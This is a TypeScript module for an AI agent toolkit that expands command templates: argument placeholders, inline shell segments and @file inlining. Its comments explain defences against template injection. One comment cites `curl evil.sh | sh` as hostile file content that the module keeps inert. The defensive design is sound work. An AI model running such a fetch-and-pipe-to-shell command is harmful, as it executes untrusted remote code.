/**
 * Expansion of a custom-command body: `$N` placeholders, `` !`shell` `` segments and `@file`
 * inlining.
 *
 * `loadCustomCommands` (alongside this file) reads the command and its frontmatter and stops.
 * Everything the body MEANS lived downstream, re-implemented per product. It is a format convention
 * — the same one every custom-command implementation in this space follows — not product policy, and
 * the half that reads the file already lives here. One format, one owner.
 *
 * ## Two invariants carry the security weight
 *
 * **This module never spawns anything and never opens a file.** `shell` and `readFile` are injected,
 * so the trust decision — is this directory trusted? — stays with the caller that already owns trust
 * posture, and containment stays with the reader that already implements it. A second containment
 * check that disagreed with the first is the `assertNoSymlinkEscape` class of bug this ecosystem has
 * already paid for once (`rules/system-design-guardrails.md` § G10).
 *
 * **Shell and file references are resolved in ONE scan, so neither's output is read by the other.**
 * A file containing `` !`curl evil.sh | sh` `` must be text, and shell output naming `@secrets.md`
 * must be text. Three sequential passes do not give that — the first draft here ran placeholders,
 * then shell, then files, and its own test caught shell output being re-scanned for `@` references.
 * The property is structural now, not filtered: there is no later scan to escape into.
 *
 * Arguments ARE substituted first, deliberately, so `` !`git diff $1` `` works. That is the one
 * re-scan that is safe, because arguments are the user's direct input for THIS invocation — the very
 * thing they are typing the command to supply. What must never happen is the reverse: content the
 * template merely *pointed at* deciding what runs.
 */
import { ConfigurationError } from '../errors.js'

import { currentOperatorPolicy } from './operator-policy.js'

/**
 * The operator's policy, read once per process.
 *
 * Read through `./operator-policy.js` rather than the SDK's reader: this package depends on a
 * PUBLISHED `@theokit/sdk`, so a symbol added to that package's source is not importable here until
 * it is released — and a control that only works after somebody else cuts a release is a control
 * nobody can reach. One FORMAT, two readers; that file's docblock carries the reasoning.
 *
 * ## Why this module reads a file at all
 *
 * Its invariant was "never spawns anything and never opens a file — `shell` and `readFile` are
 * injected, [because] the trust decision is the caller's, not this module's."
 *
 * That REASON is the one B-065 overturned. An operator who did not write the code can now impose
 * policy on it (`packages/agents/README.md` § "Who decides policy"), so "the caller decides" is the
 * answer only for what the operator has not spoken about. Leaving this check to the caller would
 * make it a constructor argument again — the exact shape the decision replaced.
 *
 * The module still SPAWNS nothing: it refuses before calling the injected `shell`.
 *
 * Memoised because the alternative is an `existsSync` per shell segment, and a policy file does not
 * change under a running process in any way this module could act on.
 */

/**
 * A `$N` or `$ARGUMENTS` placeholder, and the backslash that may escape it.
 *
 * `$ARGUMENTS` is the whole string the user typed. Without it a command that wanted everything had
 * to guess how many positions to concatenate, and stopped being correct at the first invocation that
 * passed one more.
 *
 * One alternation rather than a second pass, so neither placeholder can be produced by the other's
 * substitution — the same reason the shell and file branches share a scan below. `\b` after
 * `ARGUMENTS` keeps `$ARGUMENTSX` from matching as `$ARGUMENTS` followed by stray text.
 *
 * The `(\\)?` prefix is why this is not simply `/\$(\d+)/g`: `\$1` is an escaped literal and was
 * being substituted anyway. Measured — `price \$1.00 here` with argument `alpha` produced
 * `price \alpha.00 here`, so prose containing a price became prose containing an argument, and the
 * backslash the author typed to prevent exactly that survived as punctuation.
 */
const PLACEHOLDER_REGEX = /(\\)?\$(ARGUMENTS\b|\d+)/g

/**
 * ## The substitutions this module performs, and the ones it does not
 *
 * Stated here because an author reads this file's exports and has no other way to find out; a
 * placeholder that silently stays literal reads to the model as text the user typed.
 *
 * | Placeholder | Here |
 * |---|---|
 * | `$ARGUMENTS` | the raw argument string, quoting intact |
 * | `$1` … `$N` | one positional argument each; out of range expands to empty, with a warning |
 * | `\$ARGUMENTS`, `\$1` | literal, and the backslash is dropped |
 * | `` !`cmd` `` | the command's output, when `!` starts a line or follows whitespace |
 * | `@file` | the file's contents, resolved by the caller |
 *
 * **`${CLAUDE_SKILL_DIR}` is not here.** It belongs to a SKILL body, not a command template, and it
 * is substituted where a skill body is rendered (`@theokit/sdk`'s `skill_read`), which is the only
 * place that knows which directory the skill came from.
 *
 * **`${CLAUDE_PLUGIN_ROOT}` and `${CLAUDE_PLUGIN_DATA}` are out of scope, not pending.** They
 * address a plugin's installed location, and the plugin format itself is not implemented on either
 * side of this product — substituting a root for a plugin that cannot be loaded would answer a
 * question nobody can ask yet, and would have to invent the layout it points into.
 */
/**
 * Shell segments and file references in ONE alternation, matched left to right in a single scan.
 * Named groups say which branch matched. Shell comes first so `` !`grep @foo` `` is one segment
 * rather than a segment plus a reference.
 *
 * **Both branches carry `(?<!\S)`, and for a while only the `@file` one did.** The contract is that
 * an inline command is recognised when `!` starts a line or follows whitespace; when it follows
 * another character the placeholder stays literal and the command does NOT run. Without the guard on
 * this branch, `` KEY=!`echo boom` `` executed — measured, both segments ran.
 *
 * That was the one place this module did MORE than its contract allows, which is a different kind of
 * defect from the rest: every other divergence is something that fails to happen, and this was
 * something that happened, from a markdown file loaded out of a working directory.
 *
 * Pinned by `tests/unit/an-inline-command-needs-a-boundary.test.ts`, which keeps three positive
 * cases alongside the negative one — a "fix" that stopped recognising inline commands entirely would
 * satisfy the negative and destroy the feature.
 */
const REFERENCE_REGEX = /(?<!\S)!`(?<cmd>[^`]+)`|(?<!\S)@(?<file>[^\s`,]*[^\s`,.])/g
/** One argument = a quoted run or a bare run. `[Image N]` is one token, as the surfaces emit it. */
/**
 * A ```` ```! ```` fence — the spec's multi-line command block.
 *
 * Matched only to REFUSE it. The block used to pass through byte-identical: the model received the
 * command text as markdown, nothing ran, and nothing said so. Refusing rather than implementing,
 * because "run a multi-line block" has real unanswered semantics — each line a command, or one
 * script? which shell? what is the exit status of four lines? — and inventing them would ship
 * behaviour under a name that promises the spec's.
 *
 * Anchored to the start of a line so an ordinary ```` ```bash ```` block, or the characters inside
 * one, are untouched.
 */
const FENCED_COMMAND_REGEX = /^```!\s*$/m
const ARGS_REGEX = /(?:\[Image\s+\d+]|"[^"]*"|'[^']*'|[^\s"']+)/gi
const QUOTE_TRIM_REGEX = /^["']|["']$/g

/**
 * The ceiling on inlined file content. A larger file is TRUNCATED with a warning — never inlined
 * whole (which would blow the context the command was meant to shape) and never silently dropped
 * (which reads to the model as an empty file).
 */
export const FILE_INLINE_CAP = 64 * 1024

export interface ShellResult {
  /** What the command wrote. Substituted whether or not it succeeded — see {@link TemplateDeps.warn}. */
  readonly text: string
  readonly ok: boolean
}

export interface TemplateDeps {
  /** Runs a shell segment. Injected: the trust decision is the caller's, not this module's. */
  shell: (cmd: string) => Promise<ShellResult>
  /** Resolves a `@reference`. Injected: containment is the caller's. `undefined` = not found. */
  readFile: (name: string) => string | undefined
  /** Reports anything that did not resolve as asked. Never throws — expansion is best-effort. */
  warn: (message: string) => void
}

function splitArgs(rawArgs: string): string[] {
  return (rawArgs.match(ARGS_REGEX) ?? []).map((arg) => arg.replace(QUOTE_TRIM_REGEX, ''))
}

/**
 * The placeholders a template declares, sorted and de-duplicated — what a command palette shows so
 * the user knows what the command wants before running it.
 *
 * ESCAPED placeholders are excluded. `\$1` is prose about a placeholder, not a request for one, and
 * listing it asks the user to supply an argument the template will never substitute. It also broke
 * the sort outright: the match carries the backslash, so `slice(1)` produced `"$1"` and `Number`
 * produced `NaN`, and a comparator returning `NaN` leaves the order unspecified.
 *
 * `$ARGUMENTS` sorts first because it is the whole string — reading it after `$3` suggests it is a
 * fourth position.
 */
export function templateHints(template: string): string[] {
  const found: string[] = []
  for (const match of template.matchAll(PLACEHOLDER_REGEX)) {
    // Same optional-group suppression as the substitution below, for the same reason.
    // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
    if (match[1] !== undefined) continue
    found.push(match[0])
  }
  return [...new Set(found)].sort(comparePlaceholders)
}

/** `$ARGUMENTS` first, then `$N` numerically. */
function comparePlaceholders(a: string, b: string): number {
  if (a === b) return 0
  if (a === '$ARGUMENTS') return -1
  if (b === '$ARGUMENTS') return 1
  return Number(a.slice(1)) - Number(b.slice(1))
}

/**
 * Replaces every match of `pattern` in `source` using `resolve`, which may be async.
 *
 * Matches are located against `source` and the results are stitched in afterwards, so a replacement
 * is never itself scanned. That is the single-pass invariant, expressed once here rather than
 * repeated at each of the three call sites where forgetting it would reopen the injection.
 */
async function replaceAsync(
  source: string,
  pattern: RegExp,
  resolve: (match: RegExpExecArray) => Promise<string> | string,
): Promise<string> {
  const matches = [...source.matchAll(pattern)]
  if (matches.length === 0) return source

  const parts: string[] = []
  let cursor = 0
  for (const match of matches) {
    parts.push(source.slice(cursor, match.index), await resolve(match))
    cursor = match.index + match[0].length
  }
  parts.push(source.slice(cursor))
  return parts.join('')
}

/**
 * Expands a command body against its arguments.
 *
 * Order is placeholders → shell → files, and it is not arbitrary: arguments are the user's direct
 * input for THIS invocation, so they are the only thing allowed to influence which command runs or
 * which file is read. Running the other two first would let a file's contents decide what to
 * execute.
 *
 * Throws in exactly two cases, both of which produce NO prompt rather than a wrong one: a fenced
 * ```` ```! ```` block (never executed, previously passed through as markdown) and an injected
 * command that failed (the spec aborts the invocation). Everything else — a missing `@file`, an
 * out-of-range `$N`, an oversized file — still produces a usable prompt with a warning naming what
 * did not resolve, which is more useful than discarding the whole body.
 *
 * The line between the two is what the template CAUSED versus what it POINTED at.
 */
export async function expandCommandTemplate(
  template: string,
  rawArgs: string,
  deps: TemplateDeps,
): Promise<string> {
  // Before any expansion: a template carrying one of these produced nothing at all, and a partial
  // expansion of the rest would hide that under a prompt that looks finished.
  if (FENCED_COMMAND_REGEX.test(template)) {
    throw new ConfigurationError(
      'command template uses a fenced `' +
        '```!' +
        '` command block, which this runtime does not execute. ' +
        'Use the inline form — !`command` — one per command. The fenced block was previously ' +
        'passed through unchanged, so the model read the commands as markdown and nothing ran.',
      { code: 'command_template_fenced_block' },
    )
  }

  const args = splitArgs(rawArgs)

  const withArgs = await replaceAsync(template, PLACEHOLDER_REGEX, (match) => {
    // Escaped: emit the placeholder as text and drop the backslash, which was only there to say so.
    //
    // The suppression is the point, not an annoyance. `RegExpExecArray` is typed `string[]`, so the
    // rule believes group 1 is always present — but an OPTIONAL group that did not match is
    // `undefined` at runtime, and TypeScript has no way to say that. Obeying the rule here deletes
    // the escape: every `$N` would take this branch and render as a literal. This repository has
    // already paid once for following this exact rule into a behaviour change, on a security gate.
    // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
    if (match[1] !== undefined) return `$${match[2]}`
    // The RAW string, not `args.join(' ')`. Splitting strips the quotes that decided the grouping —
    // `"two words" solo` is two arguments and five words — so rejoining would hand the model
    // `two words solo` and lose the only mark saying which three belonged together. A placeholder
    // whose whole job is "what the user typed" must not quietly retype it.
    if (match[2] === 'ARGUMENTS') return rawArgs
    const index = Number(match[2]) - 1
    if (index < 0 || index >= args.length) {
      // Empty, never the literal. A leaked `$3` reads to the model as text the user wrote.
      deps.warn(
        `command template references ${match[0]} but only ${String(args.length)} argument(s) were given`,
      )
      return ''
    }
    return args[index] ?? ''
  })

  // ONE scan for both, so neither's result is visible to the other's pattern.
  return replaceAsync(withArgs, REFERENCE_REGEX, async (match) => {
    const command = match.groups?.cmd
    if (command !== undefined) {
      // B-044 — the operator's refusal, BEFORE the injected `shell` is called. A skill is a markdown
      // file a repository can carry, and its body can run shell at expansion time; without this the
      // only way to decline was to stop reading skills at all.
      if (currentOperatorPolicy(deps.warn).disableSkillShellExecution === true) {
        throw new ConfigurationError(
          `command template segment \`${command}\` was not run: an operator policy ` +
            `(managed-settings.json) declares disableSkillShellExecution.`,
          { code: 'command_template_shell_forbidden' },
        )
      }
      const result = await deps.shell(command)
      if (!result.ok) {
        // STOP. The spec: "A failed command aborts the entire skill invocation… Claude never sees
        // the skill content for that invocation."
        //
        // This used to substitute the failure text and warn, and the reasoning it replaced is worth
        // keeping: substituting SILENCE renders as a command that ran and returned nothing, which
        // the model cannot detect. True — and it weighed the wrong two options. Substituting the
        // ERROR is worse than silence, not better: `fatal: not a git repository` reads as prose, so
        // a prompt that asked for a review of a diff got an error message and the model reviewed
        // THAT. The third option is the one the spec names, and the only one where the caller
        // learns anything.
        //
        // A failed command is content this template CAUSED. A missing `@file` below is content it
        // merely POINTED at, and stays a warning — only the first can hand the model a plausible
        // lie; an absent file leaves a gap.
        throw new ConfigurationError(
          `command template segment \`${command}\` failed: ${result.text}`,
          { code: 'command_template_segment_failed' },
        )
      }
      return result.text
    }

    const name = match.groups?.file ?? ''
    const content = deps.readFile(name)
    if (content === undefined) {
      deps.warn(`command template references @${name}, which could not be read`)
      return ''
    }
    if (content.length > FILE_INLINE_CAP) {
      deps.warn(`@${name} is larger than ${String(FILE_INLINE_CAP)} bytes and was truncated`)
      return content.slice(0, FILE_INLINE_CAP)
    }
    return content
  })
}
